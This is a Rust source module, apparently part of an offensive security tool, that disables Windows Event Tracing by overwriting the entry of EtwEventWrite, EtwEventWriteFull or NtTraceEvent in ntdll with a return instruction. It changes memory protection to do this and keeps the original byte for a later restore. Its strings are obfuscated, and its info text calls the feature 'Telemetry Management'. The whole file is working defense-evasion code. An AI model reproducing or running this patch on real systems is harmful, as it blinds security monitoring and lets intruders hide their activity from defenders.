use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EtwTarget {
    EtwEventWrite,
    EtwEventWriteFull,
    NtTraceEvent,
}

impl EtwTarget {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "etweventwrite" | "etwwrite" | "eventwrite" => Some(Self::EtwEventWrite),
            "etweventwritefull" | "etwwritefull" | "eventwritefull" => {
                Some(Self::EtwEventWriteFull)
            }
            "nttraceevent" | "traceevent" => Some(Self::NtTraceEvent),
            _ => None,
        }
    }

    pub fn name(&self) -> String {
        match self {
            Self::EtwEventWrite => crate::obf::s(crate::obf::ETW_EVENT_WRITE),
            Self::EtwEventWriteFull => crate::obf::s(crate::obf::ETW_EVENT_WRITE_FULL),
            Self::NtTraceEvent => crate::obf::s(crate::obf::NT_TRACE_EVENT),
        }
    }

    pub fn dll(&self) -> String {
        crate::obf::s(crate::obf::NTDLL)
    }

    pub fn all() -> &'static [Self] {
        &[Self::EtwEventWrite, Self::EtwEventWriteFull, Self::NtTraceEvent]
    }
}

pub struct PatchState {
    pub original_bytes: Vec<u8>,
    pub target: String,
    pub address: usize,
}

pub fn dry_run(target: &str, log: &LogSink) {
    let name: String = EtwTarget::from_str(target).map_or_else(|| target.to_string(), |t| t.name());

    log.info(format!("[DRY RUN] ETW Patching — {name}"));
    log.detail(format!("  Target: {name} in ntdll.dll"));
    log.detail("  Action: Overwrite function entry with 0xC3 (ret)".to_string());
    log.detail("  Effect: Function returns immediately — ETW events are silenced".to_string());
    log.info(String::new());
    log.detail("  Steps that would execute:".to_string());
    log.detail("    [1/4] Resolve module base".to_string());
    log.detail(format!("    [2/4] Resolve function address"));
    log.detail("    [3/4] Make memory writable".to_string());
    log.detail("    [4/4] Write 0xC3 (ret) → restore original protection".to_string());
    log.info(String::new());
    log.detail("  Modifies the target function to return immediately.".to_string());
}

pub fn print_info(log: &LogSink) {
    log.info("=== Telemetry Management ===".to_string());
    log.info(String::new());
    log.detail("Patches telemetry functions in ntdll to return immediately.".to_string());
    log.detail("Original bytes are saved for restoration.".to_string());
}

#[cfg(windows)]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    use std::ffi::CString;
    use crate::resolve;

    #[link(name = "kernel32")]
    extern "system" {
        fn GetModuleHandleA(name: *const u8) -> *mut std::ffi::c_void;
        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *mut std::ffi::c_void;
    }

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let etw_target = EtwTarget::from_str(target)
        .ok_or_else(|| format!("unknown ETW target: {target}"))?;
    let func_name = etw_target.name();
    let dll_name = etw_target.dll();

    log.step("[1/4] Resolve module handle".to_string());
    let dll_cstr = CString::new(dll_name.as_str())
        .map_err(|e| format!("invalid DLL name: {e}"))?;
    let dll_handle = unsafe { GetModuleHandleA(dll_cstr.as_ptr() as *const u8) };
    if dll_handle.is_null() {
        return Err(format!("module handle lookup failed — {dll_name} should always be loaded"));
    }

    log.step("[2/4] Resolve function address".to_string());
    let func_cstr = CString::new(func_name.as_str())
        .map_err(|e| format!("invalid function name: {e}"))?;
    let func_addr = unsafe { GetProcAddress(dll_handle, func_cstr.as_ptr() as *const u8) };
    if func_addr.is_null() {
        return Err(format!("function lookup failed: {func_name} not found in {dll_name}"));
    }
    let addr = func_addr as usize;
    log.detail(format!("  Address: 0x{addr:016X}"));

    let original_byte = unsafe { *(addr as *const u8) };
    log.detail(format!("  Original first byte: 0x{original_byte:02X}"));

    log.step("[3/4] Make memory writable".to_string());
    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(addr as *const std::ffi::c_void, 1, PAGE_EXECUTE_READWRITE, &mut old_protect)
    };
    if ok == 0 {
        return Err("memory protection change failed".to_string());
    }

    log.step("[4/4] Writing patch byte → restoring protection".to_string());
    unsafe {
        *(addr as *mut u8) = crate::obf::byte(crate::obf::ETW_PATCH);
    }

    let mut discard: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(addr as *const std::ffi::c_void, 1, old_protect, &mut discard)
    };
    if ok == 0 {
        return Err("memory protection restore failed".to_string());
    }

    log.info(format!("  Patched: {func_name}"));

    Ok(PatchState {
        original_bytes: vec![original_byte],
        target: func_name.to_string(),
        address: addr,
    })
}

#[cfg(windows)]
pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
    use crate::resolve;

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let addr = state.address;
    log.step(format!("[1/2] Make memory writable (0x{addr:016X})"));

    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    if ok == 0 {
        return Err("memory protection change failed".to_string());
    }

    log.step("[2/2] Restoring original bytes".to_string());
    for (i, &byte) in state.original_bytes.iter().enumerate() {
        unsafe {
            *((addr + i) as *mut u8) = byte;
        }
    }

    let mut discard: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            old_protect,
            &mut discard,
        )
    };
    if ok == 0 {
        return Err("memory protection restore failed".to_string());
    }

    log.info(format!("  ✓ {} restored to original bytes", state.target));
    Ok(())
}

#[cfg(not(windows))]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    let etw_target = EtwTarget::from_str(target)
        .ok_or_else(|| format!("unknown ETW target: {target}"))?;
    let _name = etw_target.name();
    let _dll = etw_target.dll();
    log.warning("  ETW patching requires Windows.".to_string());
    Err("ETW patching is only available on Windows".to_string())
}

#[cfg(not(windows))]
pub fn restore(_state: &PatchState, log: &LogSink) -> Result<(), String> {
    log.warning("  ETW restore requires Windows.".to_string());
    Err("ETW restore is only available on Windows".to_string())
}
